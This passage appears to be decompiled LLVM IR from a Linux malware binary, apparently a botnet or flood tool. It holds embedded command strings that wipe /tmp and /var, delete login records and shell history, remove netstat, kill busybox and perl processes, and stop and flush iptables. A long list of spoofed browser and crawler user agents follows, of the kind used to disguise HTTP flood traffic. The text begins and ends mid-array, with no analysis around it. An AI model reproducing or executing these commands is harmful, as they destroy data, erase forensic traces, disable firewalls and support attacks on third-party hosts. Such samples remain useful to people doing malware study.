i8], [9 x i8]* @global_var_10017b78.639, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017b84.640, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017b90.641, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017b9c.642, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017ba8.643, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017bb4.644, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017bbc.645, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017bc4.646, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017bd0.647, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017bdc.648, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017be8.649, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017bf4.650, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017c00.651, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10017c0c.652, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017c20.653, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017c2c.654, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017c38.655, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017c44.656, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017c50.657, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017c5c.658, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017c68.659, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017c74.660, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017c80.661, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017c8c.662, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017c94.663, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017c9c.664, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017ca8.665, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017cb4.666, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017cc0.667, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017ccc.668, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017cd8.669, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10017ce4.670, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017cf8.671, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017d04.672, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017d10.673, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017d1c.674, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017d28.675, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017d34.676, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017d40.677, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017d4c.678, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017d58.679, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017d64.680, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017d6c.681, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017d74.682, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017d80.683, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017d8c.684, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017d98.685, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017da4.686, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017db0.687, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10017dbc.688, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017dd0.689, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017ddc.690, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017de8.691, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017df4.692, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017e00.693, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10017e10.694, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10017e20.695, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017e30.696, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10017e40.697, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017e50.698, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017e5c.699, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017e68.700, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10017e78.701, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017e88.702, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017e98.703, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017ea8.704, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10017eb8.705, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_10017ec8.706, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017ee0.707, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017ef0.708, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017f00.709, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10017f10.710, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017f20.711, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017864.572, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017f2c.712, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f38.713, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f40.714, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f48.715, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f50.716, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f58.717, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f60.718, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f68.719, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f70.720, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017f78.721, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017f80.722, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017f88.723, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017f90.724, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017f98.725, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017fa0.726, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017fa8.727, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017fb0.728, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017fb8.729, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017fc0.730, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017fc8.731, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017fd0.732, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017fd8.733, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017fdc.734, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017fe0.735, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017fe4.736, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017fe8.737, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017fec.738, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017ff0.739, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017ff4.740, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10017ff8.741, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017ffc.742, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018000.743, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018004.744, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018008.745, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001800c.746, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018010.747, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018014.748, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018018.749, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001801c.750, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018020.751, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018024.752, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018028.753, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001802c.754, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018038.755, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10018040.756, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018048.757, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018050.758, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018054.759, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018058.760, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001805c.761, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018060.762, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018064.763, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018068.764, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001806c.765, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018070.766, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018074.767, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001807c.768, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018084.769, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001808c.770, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018094.771, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001809c.772, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100180a4.773, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100180ac.774, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100180b4.775, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100180bc.776, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100180c4.777, i32 0, i32 0)]
@global_var_1000922c.779 = constant i32 939524096
@global_var_10019150.780 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_10009310.781 = constant i32 1207959668
@global_var_100191d4.783 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_100093d0.784 = constant i32 1207959564
@global_var_100191e4.785 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_10019210.786 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_10019228.787 = constant [22 x i8] c"history -c;history -w\00"
@global_var_10019240.788 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_10019250.789 = constant [11 x i8] c"history -c\00"
@global_var_1001925c.790 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_10019274.791 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_10019288.792 = constant [11 x i8] c"history -w\00"
@global_var_10019294.793 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_100192a8.794 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_100192b8.795 = constant [22 x i8] c"service iptables stop\00"
@global_var_100192d0.796 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_1001931c.797 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1001935c.798 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1001939c.799 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1001942c.800 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_10019464.801 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_10019484.802 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1001949c.803 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_100194f4.804 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_10019594.805 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_100195e8.806 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_1001965c.807 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_1001969c.808 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_10019754.809 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_100197a8.810 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_10019800.811 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_10019858.812 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_10019898.813 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_100198e0.814 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_10019938.815 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_100199a4.816 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_100199fc.817 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_10019a4c.818 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_10019a70.819 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_10019acc.820 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_10019adc.821 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_10019b0c.822 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_10019b30.823 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_10019b54.824 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_10019b70.825 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10019bb0.826 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10019c3c.827 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10019c84.828 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10019ccc.829 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10019d14.830 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_10019d5c.831 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_10019db0.832 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_10019e00.833 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_10019e6c.834 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_10019ec0.835 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_10019f1c.836 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_10019f78.837 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_10019fdc.838 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_1001a038.839 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1001a094.840 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1001a0f0.841 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1001a150.842 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_1001a198.843 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_1001a230.844 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_1001a27c.845 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1001a2c8.846 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_1001a318.847 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_1001a360.848 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_1001a3b4.849 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_1001a404.850 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_1001a44c.851 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_1001a498.852 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1001a4e4.853 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_1001a52c.854 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1001a57c.855 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1001a5cc.856 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1001a600.857 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1001a634.858 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_1001a67c.859 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_1001931c.797, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1001935c.798, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_1001939c.799, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_1001942c.800, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_10019464.801, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_10019484.802, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_1001949c.803, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_100194f4.804, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10019594.805, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100195e8.806, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_1001965c.807, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_1001969c.808, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10019754.809, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_100197a8.810, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10019800.811, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10019858.812, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10019898.813, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_100198e0.814, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_10019938.815, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_100199a4.816, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_100199fc.817, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_10019a4c.818, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_10019a70.819, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10019acc.820, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_10019adc.821, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_10019b0c.822, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_10019b30.823, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_10019b54.824, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_10019b70.825, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_10019bb0.826, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10019c3c.827, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10019c84.828, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10019ccc.829, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10019d14.830, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_10019d5c.831, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_10019db0.832, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_10019e00.833, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_10019e6c.834, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10019ec0.835, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10019f1c.836, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_10019f78.837, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10019fdc.838, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1001a038.839, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1001a094.840, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_1001a0f0.841, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1001a150.842, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_1001a198.843, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_1001a230.844, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1001a27c.845, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_1001a2c8.846, i32 0, i32 0), i8* getelementptr inbounds 